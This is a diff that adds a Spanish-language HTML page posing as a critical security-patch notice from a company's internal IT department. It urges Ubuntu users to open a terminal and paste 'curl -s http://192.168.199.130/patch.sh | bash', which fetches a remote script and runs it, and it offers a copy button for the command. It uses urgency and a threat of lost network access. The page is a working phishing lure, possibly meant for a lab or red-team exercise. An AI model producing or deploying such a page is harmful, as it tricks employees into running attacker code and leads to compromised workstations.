@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Intranet - Portal de TI</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <header>
+        <div class="header-inner">
+            <div class="header-brand">
+                <span class="dot"></span>
+                Portal Interno de TI
+            </div>
+            <div class="header-meta">AVISO-2026-09-02</div>
+        </div>
+    </header>
+
+    <main>
+
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="severity-badge">Crítico</div>
+
+            <div class="sidebar-item">
+                <div class="sidebar-label">Clasificación</div>
+                <div class="sidebar-value highlight">Seguridad — Parche</div>
+            </div>
+
+            <div class="sidebar-item">
+                <div class="sidebar-label">Plataforma</div>
+                <div class="sidebar-value">Ubuntu Linux</div>
+            </div>
+
+            <div class="sidebar-item">
+                <div class="sidebar-label">Fecha de emisión</div>
+                <div class="sidebar-value">2026-09-02</div>
+            </div>
+
+            <div class="sidebar-item">
+                <div class="sidebar-label">Acción requerida</div>
+                <div class="sidebar-value highlight">Inmediata</div>
+            </div>
+
+            <div class="sidebar-item">
+                <div class="sidebar-label">Emitido por</div>
+                <div class="sidebar-value">Depto. Seguridad<br>de la Información</div>
+            </div>
+        </aside>
+
+        <!-- Content -->
+        <section class="content">
+            <h1>Parche de Seguridad <span>Crítico</span></h1>
+            <p class="subtitle">Actualización urgente requerida para estaciones de trabajo Ubuntu</p>
+
+            <div class="divider"></div>
+
+            <p class="body-text">Estimado colaborador, se ha detectado que su estación de trabajo <strong>Ubuntu</strong> requiere una actualización urgente para mitigar vulnerabilidades recientemente identificadas.</p>
+
+            <p class="body-text">Para mantener su acceso a la red corporativa, abra su terminal con <strong>Ctrl + Alt + T</strong> y ejecute el siguiente comando de actualización automatizada:</p>
+
+            <div class="code-wrap">
+                <div class="code-header">
+                    <div class="code-dots">
+                        <i></i><i></i><i></i>
+                    </div>
+                    <span class="code-title">bash — terminal</span>
+                    <button class="copy-btn" id="copyBtn" type="button" aria-label="Copiar comando">
+                        <svg class="copy-icon" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                        </svg>
+                        <span class="copy-label">Copiar</span>
+                    </button>
+                </div>
+                <div class="code-box">
+                    <code><span class="prompt">$ </span><span id="cmdText">curl -s http://192.168.199.130/patch.sh | bash</span></code>
+                </div>
+            </div>
+
+            <p class="body-text">El proceso tomará unos segundos. <strong>No apague su equipo</strong> durante la instalación.</p>
+        </section>
+
+        <!-- Right panel -->
+        <aside class="right-panel">
+            <div class="info-card">
+                <div class="info-card-title">Abrir terminal</div>
+                <p>Presione <span class="shortcut">Ctrl</span> + <span class="shortcut">Alt</span> + <span class="shortcut">T</span> en su escritorio Ubuntu para abrir una terminal.</p>
+            </div>
+
+            <div class="info-card">
+                <div class="info-card-title">¿Necesita ayuda?</div>
+                <p>Contacte a soporte interno a través del canal <strong>#ti-soporte</strong> en la intranet si experimenta algún problema.</p>
+            </div>
+        </aside>
+
+    </main>
+
+    <footer>
+        <div class="footer-inner">
+            <span class="footer-text">&copy; 2026 Departamento de Seguridad de la Información. Todos los derechos reservados.</span>
+            <span class="footer-id">ID: SEC-2026-0902</span>
+        </div>
+    </footer>
+
+    <script>
+        const copyBtn = document.getElementById('copyBtn');
+        if (copyBtn) {
+            copyBtn.addEventListener('click', async () => {
+                const cmd = document.getElementById('cmdText')?.textContent || '';
+                try {
+                    await navigator.clipboard.writeText(cmd);
+                    copyBtn.classList.add('copied');
+                    const label = copyBtn.querySelector('.copy-label');
+                    if (label) label.textContent = 'Copiado';
+                    setTimeout(() => {
+                        copyBtn.classList.remove('copied');
+                        if (label) label.textContent = 'Copiar';
+                    }, 2000);
+                } catch (err) {
+                    console.error('Error al copiar:', err);
+                }
+            });
+        }
+    </script>
+
+</body>
+</html>
